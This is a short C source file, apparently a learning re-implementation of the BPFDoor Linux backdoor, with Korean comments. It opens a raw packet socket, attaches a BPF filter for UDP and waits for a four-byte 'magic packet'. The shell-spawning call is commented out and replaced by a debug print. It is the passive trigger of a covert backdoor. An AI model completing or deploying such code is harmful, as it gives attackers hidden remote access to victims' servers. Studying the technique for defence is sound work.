#include "bpfdoor.h"


bool start_bpfdoor(){
    int fd = socket(AF_PACKET,SOCK_RAW,htons(ETH_P_IP));

    if (fd < 0)
    {
        perror("socket error");
        return false;
    }

    struct sock_filter filter_set[] = {
        BPF_STMT(BPF_LD | BPF_B | BPF_ABS,23),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 17,0,1),
        BPF_STMT(BPF_RET | BPF_K, 0xFFFFFFFF),
        BPF_STMT(BPF_RET | BPF_K, 0)
    };

    struct sock_fprog filter = {
        .len = sizeof(filter_set) / sizeof(filter_set[0]),
        .filter = filter_set
    };

     setsockopt(fd,SOL_SOCKET,26,&filter,sizeof(filter));

    // 리스닝 루프 시작
    printf("while start\n");
    while(true){
        unsigned char buffer[65535];
        ssize_t received = recvfrom(fd,buffer,sizeof(buffer),0,NULL,NULL);
        printf("received\n");
        if (received < 0){
            perror("recvfrom error");
            break;
        }

        struct eth_hdr ethhdr;
        memcpy(&ethhdr,buffer,sizeof(ethhdr));

        struct ip_hdr iphdr;
        memcpy(&iphdr,buffer+sizeof(ethhdr),sizeof(iphdr));

        struct udp_hdr udphdr;
        memcpy(&udphdr,buffer+sizeof(ethhdr)+(iphdr.ihl*4),sizeof(udphdr));
        //payload 값이 0이면 continue
        if (udphdr.len == 0) continue;

        int cursor = sizeof(ethhdr)+(iphdr.ihl*4)+sizeof(udphdr);
        const uint8_t magic_packet[4] = {0xFF,0xFF,0xFF,0xFF};
        char data[4];
        memcpy(data,buffer+cursor,4);

        if(memcmp(magic_packet,data,4) == 0){
            // start_shell();
            printf("debug1\n");
        }


    }


    close(fd);
    return true;
}